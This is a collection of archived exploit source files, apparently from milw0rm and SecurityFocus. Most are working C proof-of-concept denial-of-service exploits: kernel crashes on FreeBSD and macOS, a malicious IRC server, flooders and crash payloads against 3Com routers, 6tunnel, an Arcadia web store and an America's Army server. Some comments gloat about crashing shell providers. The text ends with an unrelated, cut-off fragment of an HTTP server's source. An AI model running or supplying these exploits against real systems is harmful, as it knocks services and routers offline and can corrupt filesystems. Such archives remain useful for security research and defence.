/* FreeBSD cvs commit: src/sys/ufs/ufs/ufs_vnops.c maxim 2006-05-31 13:15:29 UTC
   Log: According to POSIX, the result of ftruncate(2) is unspecified
   for file types other than VREG, VDIR and shared memory objects.
   We already handle VREG, VLNK and VDIR cases.  Silently ignore
   truncate requests for all the rest. PR kern/98064

   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"!
   tested on FreeBSD 6.0-RELEASE-p5, 6.1-RELEASE-p10 (latest at the time of writing)
   - it just makes the system reboot, and with a bit of luck fucks up the filesystem.
   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
   
*/

#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(){
mkfifo("lol",0x1b6);
int fd = open("lol",O_RDWR); 
ftruncate(fd,12345);
close(fd);
}

// milw0rm.com [2006-10-13]
/* xnu-macfsstat-leak.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS POC
 * by mu-b - Sun 13 Apr 2008
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#define LEAK_BUFBYTES(a) (sizeof (struct statfs)*a)
#define LEAK_MACBYTES(a) (sizeof (int)*a)

struct __mac_getfsstat {
  char *buf;   char _pad[4];
  int bufsize; char __pad[4];
  char *mac;   char ___pad[4];
  int macsize; char ____pad[4];
  int flags;   char _____pad[4];
};

int
main (int argc, char **argv)
{
  struct __mac_getfsstat req;
  int i, n;

  printf ("Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  memset (&req, 0, sizeof req);
  req.buf = (char *) 0xDEADBEEF;
  req.bufsize = LEAK_BUFBYTES (65536 * 64);
  req.mac = (char *) 0xDEADBEEF;
  req.macsize = LEAK_MACBYTES (65536 * 64);

  for (i = 0; i < 2; i++)
    {
      if ((n = syscall (SYS___mac_getfsstat, req.buf, req.bufsize, req.mac, req.macsize, req.flags)) < 0)
        {
          fprintf (stderr, "leaked %lu-bytes of kernel memory!\n", LEAK_MACBYTES (65536 * 64));
        }
    }

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-03-23]
/*
	0irc-client v1345 build 20060823 DoS Exploit By DiGitalX (DiGi7alX@Gmail.com)
	Date: 22/3/2007 -- MicroSystem Team -- Site: http://DiGitalX.I.am
	Description: 0irc-client suffers from a NULL pointer derefrencing bug.
*/

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "wsock32.lib")

// `perl -e "print 'a' x 623";`
#define As "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

int main()
{
	struct sockaddr_in sa, nsa;
	SOCKET s, ns;
	WSADATA wsa;
	int err, val;
	char buffer[1000]; /* evil buffer holder */

	printf("0irc-client v1345 build 20060823 DoS Exploit By DiGitalX\n");
	printf("MicroSystem Team -- Date: 22/3/2007 -- http://DiGitalX.I.am\n");
	printf("Contact: DiGi7alX@Gmail.com\n\n");

	printf("Initializing...\n");

	/* first open the ircd */
	//fire up winsock
	if ((err = WSAStartup(MAKEWORD(1, 1), &wsa)) != 0) {
		//if winsock is sick :P
		printf("Error: Cannot initialize winsock (%d).\n", err);
		return 1;
	}
	//create a socket
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET) {
		//if socket cannot be created inform user
		printf("Error: Cannot create socket (%d).\n", WSAGetLastError());
		return 1;
	}
	//starting building the sockaddr_in struct
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = INADDR_ANY;
	sa.sin_port = htons(6667); /* default ircd port */
	//now bind the socket to the port
	if (bind(s, (const struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
		//if bind error inform user
		printf("Error: Cannot bind socket to port 6667 (%d).\n", WSAGetLastError());
		return 1;
	}
	//do listen for incoming connections
	if (listen(s, SOMAXCONN) == SOCKET_ERROR) {
		//cannot listen tell user
		printf("Error: Cannot listen for incoming connections (%d).\n", WSAGetLastError());
		return 1;
	}
	//listen OK
	//set sockaddr_in structcure size
	val = sizeof(nsa);
	//now do accept clients
	printf("Now connect using 0irc client.\n");
	if ((ns = accept(s, (struct sockaddr *)&nsa, &val)) == INVALID_SOCKET) {
		//if accept fails
		printf("Error: Cannot accept incoming connection (%d).\n", WSAGetLastError());
		return 1;
	}
	//accept OK .. inform user of new connection
	printf("New Connection: %s\n", inet_ntoa(nsa.sin_addr));
	//now the real job begins :D
	snprintf(buffer, sizeof(buffer)-1, ":aaa 001 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, ":aaa 002 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, ":aaa 003 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, ":aaa 004 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, ":aaa 005 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, ":"As" 727 DiGitalX\r\n\0");
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
		return 1;
	}
	//wait sometime
	Sleep(1200);
	//cleanup
	//close sockets
	closesocket(ns);
	closesocket(s);
	//close winsock
	WSACleanup();

	return 0; /* end of work :D */
}

// milw0rm.com [2007-03-22]
source: http://www.securityfocus.com/bid/2905/info

1C: Arcadia Internet Store is a online shopping utility for Microsoft Windows NT/2000 that is fully integratable with 1C: Enterprise, another popular Russian web-commerce utility.

One of the components of this package, 'tradecli.dll', allows users to specify a template file, the contents of which will be output.

Remote attackers can request dos devices, such as 'con', 'com1', 'com2', etc. When 'tradecli.dll' attempts to open these files a denial of service may occur. 

/*
 Proof of conecpt code by linux^sex
 Exploit provided by NERF Security gr0up
 Attempts to crash any server you specify
 running Arcadia 1C: Arcadia Internet Store 1.0
 on Windows NT/2000 fully integratable with 
 1C: Enterprise, another popular Russian 
 web-commerce utility. 

 code request dos devices, such as 'con', 'com1', 'com2', etc. 
 When 'tradecli.dll' attempts to open these files a denial of 
 service may occur. Vendor has not released any patches as of yet
 NOTE: I take no responsibility for the mis-use of this code
*/
 



#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 80
char death[]= {
  "GET /scripts/tradecli.dll?template=com1 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=com2 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=com3 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=con HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=prn HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=aux HTML/1.0\n\n\n"
};

int main(int argc, char *argv[]) {
  int sockfd;
  char buf[1024];
  struct hostent *ha;
  struct sockaddr_in sa;
  if (argv[1] == NULL) {
    printf("Usage: %s <HOST>\n", argv[0]);
    printf("Proof of concecpt code by linux^sex\n");
    printf("contact me at linuxsex@crackdealer.com\n");
    printf("props to r00t-access crew\n");
    printf("visit us at www.r00taccess.ath.cx\n");
    exit(0);
  }

  if (!(ha = gethostbyname (argv[1])))
    perror ("gethostbyname");

  bzero (&sa, sizeof (sa));
  bcopy (ha->h_addr, (char *) &sa.sin_addr, ha->h_length);
  sa.sin_family = ha->h_addrtype;
  sa.sin_port = htons (PORT);
    
  if ((sockfd = socket (ha->h_addrtype, SOCK_STREAM, 0)) < 0) {
    perror ("socket");
    exit (1);
  }
  printf("Connecting\n");
  if (connect (sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    perror ("connect");
    exit (1);
  }
  printf("Connected...\nrequesting dos devices\n");
  send(sockfd, death, sizeof(death), 0);
  read(sockfd, buf, 1024, 0);
  if (buf != NULL) {
    printf("Host is not vulnerable\n");
    close(sockfd);
  }
}

source: http://www.securityfocus.com/bid/8248/info

A problem in the 3Com 812 OfficeConnect has been reported that may result in the router becoming unstable. Because of this, an attacker may be able to deny service to legitimate users of the vulnerable router by submitting an excessively long request.

/* 3com-DoS.c
 *
 * PoC DoS exploit for 3Com OfficeConnect DSL Routers.
 This PoC exploit the
 * vulnerability documented at:
<http://www.securityfocus.com/bid/8248>,
 * discovered by David F. Madrid.
 *
 * Successful exploitation of the vulnerability should
cause the router to
 * reboot.  It is not believed that arbitrary code
execution is possible -
 * check advisory for more information.
 *
 * -shaun2k2
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
        if(argc < 3) {
                printf("3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n");
                printf("Usage: 3comDoS <3com_router> <port>\n");
                exit(-1);
        }

        int sock;
        char explbuf[521];
        struct sockaddr_in dest;
        struct hostent *he;

        if((he = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve %s!\n", argv[1]);
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                perror("socket()");
                exit(-1);
        }

        printf("3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n");

        dest.sin_addr = *((struct in_addr *)he->h_addr);
        dest.sin_port = htons(atoi(argv[2]));
        dest.sin_family = AF_INET;

        printf("[+] Crafting exploit buffer.\n");
        memset(explbuf, 'A', 512);
        memcpy(explbuf+512, "\n\n\n\n\n\n\n\n", 8);

        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) == -1) {
                perror("connect()");
                exit(-1);
        }

        printf("[+] Connected...Sending exploit buffer!\n");
        send(sock, explbuf, strlen(explbuf), 0);
        sleep(2);
        close(sock);
        printf("\n[+] Exploit buffer sent!\n");
        return(0);
}
source: http://www.securityfocus.com/bid/2721/info

OfficeConnect 812 is a DSL router manufactured by 3Com, and distributed by numerous DSL providers. OfficeConnect 812 is an integrated ADSL router with an onboard 4 port switch.

A problem in the firmware included with this router could allow a Denial of Service. It is possible to reboot the router by connecting to the HTTP daemon, and requesting a long string. The router will power-cycle itself.

This problem makes it possible for a remote user to deny service to legimate users of networks serviced by the router. 

// 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
// Proof of concept, soft and hard reset, the security is weak
// Written pour sniffer <sniffer@sniffer.net> 
// Fri Sep 21 15:51:35 BRT 2001
// Viva Brazil!

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

void 
usage(binary)
char *binary;
{
fprintf(stderr,"3Com OfficeConnect 812 ADSL Router Denial of Service (%s)\nsniffer <sniffer@sniffer.net>\n\t%s <1 (soft) || 2 (hard)> <remote router>\n", __FILE__, binary);
}
int
main(argc, argv)
int argc;
char **argv;
{
int sockfd;
char senddata[1024];
char hardreset_data[] = { 
									 71,69,84,32,47,103,114,97,112,104,105,99,115,
                   47,115,109,108,51,99,111,109,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,32,72,84,84,80,
                   47,49,46,48,10,10,0 };
char softreset_data[] = {
                   80,79,83,84,32,47,70,111,114,109,115,47,97,
                   100,115,108,95,114,101,115,101,116,32,72,84,84,
                   80,47,49,46,49,10,72,111,115,116,58,32,49,
                   57,50,46,49,54,56,46,49,46,50,53,52,10,
                   67,111,110,110,101,99,116,105,111,110,58,32,99,
                   108,111,115,101,10,67,111,110,116,101,110,116,45,
                   76,101,110,103,116,104,58,32,49,57,10,10,83,
                   117,98,109,105,116,61,82,101,115,101,116,37,50,
                   48,76,105,110,101,10,10,0 };
struct hostent *he;
struct sockaddr_in their_addr;
								
if( argc != 3 )
{
	usage(argv[0]);
	exit(0);
}
if( atoi(argv[1]) >= 3 || atoi(argv[1]) == 0 )
{
	  usage(argv[0]);
		exit(0);	
}
if((he=gethostbyname(argv[2])) == NULL)
{
	herror("gethostbyname");
	exit(1);
}

their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(80);
their_addr.sin_addr = (*(struct in_addr *)he->h_addr);
bzero(&their_addr.sin_zero, 8);

if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) 
{
	perror("socket");
	exit(1);
}

if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1) 
{
	perror("connect");
	exit(1);
}
else
{
	printf("connected\n");
}
if(atoi(argv[1]) == 1)
	strncpy(senddata, softreset_data, strlen(softreset_data));
else if(atoi(argv[1]) == 2)
	strncpy(senddata, hardreset_data, strlen(hardreset_data));

if(send(sockfd, senddata, sizeof(senddata), 0) == -1) 
{
	perror("send");
	exit(1);
}
else
{
	printf("evil data sent\n.. have a rice day\n");
}

close(sockfd);
return(0);				
}
source: http://www.securityfocus.com/bid/7175/info

 vulnerability has been reported in the 3Com SuperStack II RAS 1500 router. The problem occurs when processing network packets containing malicious IP headers. When received, the packet may cause the router to crash.

/*
 * 3com superstack II RAS 1500 remote Denial of Service
 *
 * Piotr Chytla <pch@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 *
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <libnet.h>
#define OPT_LEN 4
void usage()
{
  printf("Args: \n");
  printf("-s [source address]\n");
  printf("-d [destination address]\n");
}

int main(int argc,char *argv[])
{
 char a;
 int sock,r;
 u_long src;
 u_long dst;
 char pktbuf[IP_MAXPACKET];
 char payload[]="ABCDEFGHIJKLMNOPRST";
 u_char options[4];
 struct ipoption ipopt;
 bzero(options,OPT_LEN);
 while((a=getopt(argc,argv,"d:s:h?"))!=EOF)
 {
     switch(a) {
         case 'h' : { usage(); exit(1); }
         case 's' : { src=libnet_name_resolve(optarg,0); break;}
         case 'd' : { dst=libnet_name_resolve(optarg,0); break;}
        }
 }
 sock = libnet_open_raw_sock(IPPROTO_RAW);
 if (sock<0)
 {
 perror("socket");
 exit(1);
 }

 libnet_build_ip(strlen(payload),0,0x1337,0,255,0xaa,src,dst,payload,strlen(payload),pktbuf);
  memcpy(ipopt.ipopt_list, options, OPT_LEN);
  *(ipopt.ipopt_list)     = 0xe4;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  r=libnet_insert_ipo(&ipopt,OPT_LEN,pktbuf);
  if (r <0)
   {
        libnet_close_raw_sock(sock);
        printf("Error ip options insertion failed\n");
        exit(1);
   }
  r=libnet_write_ip(sock,pktbuf,LIBNET_IP_H+OPT_LEN+strlen(payload));
  if (r<0)
  {
   libnet_close_raw_sock(sock);
   printf("Error write_ip \n");
   exit(1);
  }
 libnet_close_raw_sock(sock);
 return 0;
}

source: http://www.securityfocus.com/bid/3467/info

6tunnel is a freely available, open source software package designed to provide IPv6 functionality to hosts that do not comply with the standard. It works by creating IPv6 tunnels.

A problem has been discovered in the software package that could allow remote users to deny service to legitimate users of the service. The problem is due to the management of sockets by the software package. When a client disconnects from the 6tunnel server, the socket previously used by the client enters the CLOSE state and does not time out. Once a large number of sockets is reached, the service crashes.

This makes it possible for a malicious user to deny service to legitimate users of the service. 

/* 
 * ipv4/ipv6 tcp connection flooder.
 * Originally used as a DoS for 6tunnel (versions < 0.08).
 * Version 0.08 is a broken version. Please update to 0.09.
 *
 * Description of options:
 * -6	:	flood an ipv6 address.
 * port :	tcp port to flood (default: 667)
 * delay:	delay between connections (ms).
 * times:	max number of connections (default: 2500).
 *
 * awayzzz <awayzzz@digibel.org>
 * You can even find me @IRCnet if you need.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEFP	667		// default port.
#define DEFT	2500		// default number of connections.
#define TIME	100000	// delay between connections.
                        	// tune it for best performances!

#define HAVE_IPV6

#define VALID_PORT(i)   (i<65535 && i > 0)

int main(int argc,char *argv[])
{

   int ret, fd, i, ip6 = 0;
   int times = DEFT, port = DEFP, delay = TIME;
   struct sockaddr_in sin;
  
#ifdef HAVE_IPV6
   struct sockaddr_in6 sin6;
#endif

   if( argc < 2 ) 
   {
       char *pname;

       if(!(pname = strrchr(argv[0],'/')))
          pname = argv[0];
       else
          pname++;

       printf("Usage: %s [-6] ip4/6 [port] [delay (ms)] [times]\n", pname);
       exit (0);
   }

   if(!strcmp(argv[1],"-6"))
   {

#ifdef HAVE_IPV6
      ip6 = 1;
#endif
      argv++;
      argc--;
   }

   if(argc > 2)
   {
      port = strtol(argv[2], NULL, 10);
      if(!VALID_PORT(port))
      {
         fprintf(stderr,"Invalid port number. Using default\n");
         port = DEFP;
      }
   }

   if(argc > 3)
      delay = strtol(argv[3], NULL, 10);

   if(argc > 4)
      times = strtol(argv[4], NULL, 10);

   printf("Started with %s flood to %s on %d for %d times!\n",
         (ip6 == 1) ? "ipv6" : "ipv4", argv[1], port, times);
    
   for (i = 0; i < times; i++) 
   {
     
#ifdef HAVE_IPV6
      if(ip6)
      {
         fd = socket(AF_INET6, SOCK_STREAM, 0);
         memset(&sin6, 0, sizeof(sin6));

         sin6.sin6_family = AF_INET6;
         sin6.sin6_port = htons(port);
         inet_pton(AF_INET6,argv[1],sin6.sin6_addr.s6_addr);
      }
      else
      {
#endif /* HAVE_IPV6 */

         fd = socket(AF_INET, SOCK_STREAM, 0);
         memset(&sin, 0, sizeof(sin));

         sin.sin_family = AF_INET;
         sin.sin_addr.s_addr = inet_addr(argv[1]);
         sin.sin_port = htons(port);

#ifdef HAVE_IPV6
      }
      if(ip6)
         ret = connect(fd, (struct sockaddr *)&sin6, sizeof(sin6));
      else
#endif 
         ret = connect(fd, (struct sockaddr *)&sin, sizeof(sin));

      if(ret < 0)
      {
         printf("connect %d failed.\n",i);
         perror("connect");
         break;
      }
      
      printf("Connection no. %d\n",i);
      close(fd);
      usleep(delay);
   }
}
/* :wq *//*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        1716
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"
#define AABOOMPB1   "\xff\xff\xff\xff" "PB_Y"
#define AABOOMPB2   "\xff\xff\xff\xff" "PB_U" "\xff\xff\xff\xff" \
                    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" \
                    "127.0.0.1:1234;"




int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putpt(u8 *dst, u8 *pat, int len);
int putmm(u8 *buff, u8 *data, int len);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            noquery = 0;
    u16     port    = PORT;
    u8      buff[8192],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "America's Army <= 2.8.2 unexploitable buffer-overflow through Punkbuster "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- query server:\n");
    len = send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, buff, sizeof(buff), &peer, 0);
    if(len < 0) {
        printf("- no reply received, I try to continue\n");
        noquery = 1;
    } else {
        gs_handle_info(buff, len, 0, '\0',  5, 0, NULL);
    }

    sleep(ONESEC);
    printf("- send malformed packets\n");

    p = buff;
    p += putmm(p, AABOOMPB1, sizeof(AABOOMPB1) - 1);
    p += putpt(p, "a", 1024);
    len = send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);

    p = buff;
    p += putmm(p, AABOOMPB2, sizeof(AABOOMPB2) - 1);
    p += putpt(p, "a", 1024);
    *p++ = ';';
    len = send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);

    if(noquery) {
        printf("- the server should have been crashed, check it manually\n");
    } else {
        printf("- wait some seconds\n");
        sleep(ONESEC * 3);

        printf("- check server:\n");
        len = send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, buff, sizeof(buff), &peer, 0);
        if(len < 0) {
            printf("\n  Server IS vulnerable!!!\n");
        } else {
            printf("\n  Server doesn't seem vulnerable\n");
        }
    }

    close(sd);
    return(0);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) std_err();
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int putpt(u8 *dst, u8 *pat, int len) {
    int     patlen;
    u8      *p;

    patlen = (*pat) ? strlen(pat) : 1;
    p = dst;

    for(len /= patlen; len; len--) {
        memcpy(p, pat, patlen);
        p += patlen;
    }
    return(p - dst);
}



int putmm(u8 *buff, u8 *data, int len) {
    memcpy(buff, data, len);
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/* Author: Hui Chen <usa.chen[at]gmail[dot]com>
 *
 * FleaHttpd: A fast Httpd as small as a flea
 * Published under GNU Public License version 3
 *
 */
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define ERROR   1
#define MAX_MSG 1000
#define MSG_LEN_LIMIT 4000
#define PAGE_LEN_LIMIT 10000000
#define DEFAULT_PAGE_LEN_LIMIT 1000000

inline int readline (int, char *, size_t, int);
inline void print_usage ();

int
main (int argc, char *argv[])
{

  int i, j, k, n;
  int p[2];
  FILE *ptr;
  int pid;
  int page_len = 0, default_page_len, page_404_len;
  int content_length;
  int use_default, use_404;
  int sd, newSd, server_port = 80;
  char server_port_c[20];
  socklen_t cliLen;
  struct sockaddr_in cliAddr, servAddr;
  char *pi, *pos;
  char filename[2560], script_name[2560], script_query[2560],
    line[MAX_MSG + 1];
  int script_query_len;
  char *message = malloc (MSG_LEN_LIMIT);;
  char *root_dir = NULL;
  int support_cgi = 0;
  int http_method;		//0 GET, 1 POST, 2 PUT, 3 others
